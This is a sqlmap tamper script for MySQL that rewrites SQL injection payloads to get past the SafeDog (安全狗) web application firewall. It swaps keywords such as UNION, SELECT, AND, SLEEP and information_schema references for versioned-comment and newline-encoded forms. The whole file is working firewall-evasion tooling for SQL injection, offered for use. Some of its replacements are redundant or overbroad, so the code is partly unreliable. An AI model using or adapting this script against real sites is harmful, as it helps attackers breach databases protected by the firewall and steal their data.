#!/usr/bin/env python
"""
Author:lemonlove7
"""
import os,re
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS

priority = PRIORITY.HIGHEST

def dependencies():
        singleTimeWarnMessage("安全狗tamper脚本(%s)--Author:赏月 '%s'" % (DBMS.MYSQL,os.path.basename(__file__).split(".")[0]))
def tamper(payload, **kwargs):
    # 基本替换
    payload=payload.replace('AND','/*!11440AND*/')
    payload=payload.replace('AND','/*!--+/*%0aAND*/')
    payload=payload.replace('ORDER','/**/order/*/%0a*a*/')
    payload=payload.replace("SELECT","/*!11440SELECT*/")
    payload=payload.replace("SLEEP(","sleep(/*!/*//*/1*/")
    payload=payload.replace("UPDATEXML(","UPDATEXML(/*!/*//*/1*/")
    payload=payload.replace("SESSION_USER()","/*!11440SESSION_USER()*/")
    payload=payload.replace("SESSION_USER()","SESSION_USER(/*!/*/%0a*a*/*/)")
    payload=payload.replace("USER()","USER(/*!/*//*/*/)")
    payload=payload.replace("USER()","USER(/*!/*/%0a*a*/*/)")
    payload=payload.replace("DATABASE()","DATABASE(/*!/*//*/*/)")
    payload=payload.replace("DATABASE()","DATABASE(/*!/*/%0a*a*/*/)")
    payload=payload.replace("ORDER BY","/**/order/*/%0a*a*/by/**/")
    payload=payload.replace("UNION","/*/*/union/*!88888c*//*/%0a*a*/")
    payload=payload.replace("UNION","/*/*/union/*!88888c*//*")
    payload=payload.replace("INFORMATION_SCHEMA.SCHEMATA","/*!--+/*%0ainformation_schema.schemata*/")
    payload=payload.replace("INFORMATION_SCHEMA.TABLES","/*!--+/*%0ainformation_schema.tables*/")
    payload=payload.replace("INFORMATION_SCHEMA.COLUMNS","/*!--+/*%0ainformation_schema.columns*/")
    payload=payload.replace("count(*)","count(1)")
    payload=payload.replace("as","/*!14400as*/")
    payload=payload.replace("char","/*!14400char*/")
    
    return payload